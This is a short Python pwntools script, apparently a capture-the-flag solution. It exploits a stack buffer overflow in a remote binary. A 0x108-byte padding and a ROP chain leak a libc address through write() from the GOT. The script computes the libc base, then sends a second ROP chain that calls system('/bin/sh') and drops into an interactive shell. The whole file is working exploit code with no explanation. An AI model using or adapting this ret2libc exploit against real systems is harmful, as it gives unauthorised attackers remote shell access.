from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal=['tmux','split','-h']
#p=process('./pwn')
p=remote("0.0.0.0",1025)
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 		= lambda a,b: p.sendafter(a,b)
ra 		= lambda a: p.readuntil(a)
s		= lambda a: p.send(a)
rdi = 0x0000000000400623
rsi = 0x0000000000400621
got= 0x601018
write = 0x400436
libc = ELF("./libc-2.23.so")
#gdb.attach(p)
s(b"A"*0x108+flat([rdi,1,rsi,got,0,write,0x400566]))
p.read(0x100)
base = u64(p.read(8))-libc.sym['write']
log.warning(hex(base))
libc.address =base
s(b"A"*0x108+flat([rdi,libc.search(b"/bin/sh").__next__(),libc.sym['system']]))
p.interactive()
